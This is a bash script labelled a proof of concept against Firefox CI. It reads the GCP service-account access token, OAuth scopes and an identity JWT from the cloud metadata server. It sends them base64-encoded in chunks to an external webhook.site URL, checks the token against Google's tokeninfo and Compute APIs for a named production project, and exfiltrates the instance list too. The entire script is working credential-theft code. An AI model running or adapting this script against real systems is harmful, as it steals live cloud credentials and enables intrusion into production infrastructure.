#!/bin/bash
# FirefoxCI PoC v4 — GCP Token Exfiltration (Full Token)
# WARNING: This retrieves a LIVE GCP token. Handle with extreme care.
# Do NOT paste full token into public logs or reports.

set +e

WEBHOOK_URL="https://webhook.site/2e7af29f-f5f5-4650-a012-99d14df3f88a"
PROXY_URL="${TASKCLUSTER_PROXY_URL:-http://taskcluster}"

echo "========================================"
echo "[*] GCP Token Exfiltration PoC v4"
echo "[*] Task ID: ${TASK_ID:-unknown}"
echo "[*] Started: $(date -u +%Y-%m-%dT%H:%M:%SZ)"
echo "========================================"

# ------------------------------------------------
# 1. Retrieve full GCP access token
# ------------------------------------------------
echo ""
echo "[*] === Retrieving GCP access token ==="

TOKEN_JSON="/tmp/gcp_token_full.json"

curl -s -o "$TOKEN_JSON" \
  -H "Metadata-Flavor: Google" \
  --max-time 10 \
  "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token" 2>/dev/null

TOKEN_LEN=$(wc -c < "$TOKEN_JSON" 2>/dev/null || echo 0)
TOKEN_STATUS=$(head -c 1 "$TOKEN_JSON" 2>/dev/null && echo "200" || echo "000")

echo "[*] Token response length: ${TOKEN_LEN} bytes"

if [ "$TOKEN_LEN" -gt 100 ]; then
    echo "[*] Token retrieved successfully."

    # Extract access_token value (full)
    ACCESS_TOKEN=$(python3 -c "import sys,json; d=json.load(open('$TOKEN_JSON')); print(d.get('access_token',''))" 2>/dev/null)
    TOKEN_TYPE=$(python3 -c "import sys,json; d=json.load(open('$TOKEN_JSON')); print(d.get('token_type',''))" 2>/dev/null)
    EXPIRES_IN=$(python3 -c "import sys,json; d=json.load(open('$TOKEN_JSON')); print(d.get('expires_in',''))" 2>/dev/null)

    echo "[*] Token type: ${TOKEN_TYPE}"
    echo "[*] Expires in: ${EXPIRES_IN} seconds"
    echo "[*] Token length: ${#ACCESS_TOKEN} characters"

    # Send to webhook as base64 (safe for URL)
    B64_TOKEN=$(echo -n "$ACCESS_TOKEN" | base64 -w 0)

    # Send in chunks if too long for URL
    CHUNK_SIZE=1800
    TOTAL_LEN=${#B64_TOKEN}
    CHUNKS=$(( (TOTAL_LEN + CHUNK_SIZE - 1) / CHUNK_SIZE ))

    echo "[*] Sending token to webhook in ${CHUNKS} chunk(s)..."

    for i in $(seq 0 $((CHUNKS - 1))); do
        START=$((i * CHUNK_SIZE))
        CHUNK=$(echo "$B64_TOKEN" | cut -c$((START + 1))-$((START + CHUNK_SIZE)))
        curl -s -o /dev/null \
          "${WEBHOOK_URL}?poc=token_exfil&part=${i}&of=${CHUNKS}&chunk=${CHUNK}&task=${TASK_ID}" 2>/dev/null || true
        echo "[*]   Chunk ${i}/${CHUNKS} sent."
    done

    echo "[*] Token exfiltrated to webhook. Reassemble base64 chunks there."

    # Also verify token is valid by calling tokeninfo (without leaking in log)
    # Result goes to webhook only
    TOKEN_INFO=$(curl -s "https://www.googleapis.com/oauth2/v1/tokeninfo?access_token=${ACCESS_TOKEN}" 2>/dev/null | base64 -w 0)
    curl -s -o /dev/null \
      "${WEBHOOK_URL}?poc=token_info&b64=${TOKEN_INFO:0:2000}&task=${TASK_ID}" 2>/dev/null || true
    echo "[*] Token info (scopes, email) sent to webhook."

    # Cleanup
    rm -f "$TOKEN_JSON"

    # Verify with a safe API call (list instances in zone)
    # Only send status/length to log, full response to webhook
    echo "[*] Verifying token against GCP Compute API..."
    VERIFY_TMP="/tmp/gcp_verify.json"
    curl -s -o "$VERIFY_TMP" -w "%{http_code}" \
      -H "Authorization: Bearer ${ACCESS_TOKEN}" \
      --max-time 10 \
      "https://compute.googleapis.com/compute/v1/projects/fxci-production-level1-workers/zones/us-central1-a/instances" 2>/dev/null || echo "000"

    VERIFY_STATUS=$(cat "$VERIFY_TMP" 2>/dev/null | head -c 1 && echo "200" || echo "000")
    VERIFY_LEN=$(wc -c < "$VERIFY_TMP" 2>/dev/null || echo 0)

    echo "[*] GCP Compute API status: ${VERIFY_STATUS}"
    echo "[*] Response length: ${VERIFY_LEN} bytes"

    if [ "$VERIFY_STATUS" = "200" ]; then
        echo "[*] CRITICAL: Token is VALID and can list GCP instances."
        # Send instance list to webhook (not log)
        B64_VERIFY=$(base64 -w 0 "$VERIFY_TMP")
        curl -s -o /dev/null \
          "${WEBHOOK_URL}?poc=gcp_instances&b64=${B64_VERIFY:0:3000}&task=${TASK_ID}" 2>/dev/null || true
        echo "[*] Instance list sent to webhook."
    else
        echo "[*] Token may be expired or lack compute scope."
    fi

    rm -f "$VERIFY_TMP"

else
    echo "[*] Failed to retrieve token (length: ${TOKEN_LEN})."
fi

# ------------------------------------------------
# 2. Also try to list all available scopes
# ------------------------------------------------
echo ""
echo "[*] === Listing available OAuth scopes ==="

SCOPES=$(curl -s -H "Metadata-Flavor: Google" \
  --max-time 5 \
  "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/scopes" 2>/dev/null)

if [ -n "$SCOPES" ]; then
    echo "[*] Available scopes:"
    echo "$SCOPES" | while read line; do
        echo "[*]   - $line"
    done
    # Send to webhook
    B64_SCOPES=$(echo "$SCOPES" | base64 -w 0)
    curl -s -o /dev/null \
      "${WEBHOOK_URL}?poc=scopes&b64=${B64_SCOPES}&task=${TASK_ID}" 2>/dev/null || true
else
    echo "[*] Could not retrieve scopes."
fi

# ------------------------------------------------
# 3. Get instance identity JWT (if available)
# ------------------------------------------------
echo ""
echo "[*] === Retrieving instance identity JWT ==="

JWT_TMP="/tmp/gcp_jwt.json"
curl -s -o "$JWT_TMP" \
  -H "Metadata-Flavor: Google" \
  --max-time 10 \
  "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/identity?audience=https://firefox-ci-tc.services.mozilla.com" 2>/dev/null

JWT_LEN=$(wc -c < "$JWT_TMP" 2>/dev/null || echo 0)
if [ "$JWT_LEN" -gt 100 ]; then
    echo "[*] JWT identity token retrieved: ${JWT_LEN} bytes"
    B64_JWT=$(base64 -w 0 "$JWT_TMP")
    curl -s -o /dev/null \
      "${WEBHOOK_URL}?poc=jwt&b64=${B64_JWT:0:3000}&task=${TASK_ID}" 2>/dev/null || true
    echo "[*] JWT sent to webhook."
else
    echo "[*] JWT not available (status or no identity endpoint)."
fi
rm -f "$JWT_TMP"

echo ""
echo "[*] === PoC v4 complete ==="
echo "[*] Check webhook.site for full token and verification results."
